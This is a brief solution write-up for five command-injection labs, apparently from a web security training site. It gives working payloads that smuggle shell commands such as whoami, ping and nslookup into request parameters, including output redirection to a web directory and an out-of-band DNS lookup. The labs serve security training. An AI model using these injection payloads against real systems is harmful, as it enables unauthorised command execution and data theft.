1. This lab is vulnerable to a simple command injection. First, I used the burp proxy to capture traffic checking the stock of an item. From there, the injection can be done by modifying the `storeId` parameter to have a value such as `1%26whoami` (note that `%26` is a URL-encoded `&`)
2. This lab has a blind injection in the feedback form. This can be exploited by sending the email parameter as a payload such as `a%26ping -c10 8.8.8.8%26`
3. This lab has the same blind injection as the previous. In order to extract data, command output can be redirected to the `/var/www/images` directory and then retrieved as an image. The payload in the email parameter is as follows `a%26whoami > /var/www/images/whoami%26`, and the data can be retrieved by running `curl https://ac411ff11e45c700c080578c00c20009.web-security-academy.net/image?filename=whoami`
4. This lab has the same blind injection as the previous, but requires triggering a DNS lookup for the domain `burpcollaborator.net` to solve. The following payload in the email parameter solves the lab `a%26nslookup burpcollaborator.net%26`
5. This lab is not possible without using Burp Suite Professional. The lab's firewall stops out of band traffic that doesn't go to burp collaborator, so the necessary data cannot be exfiltrated
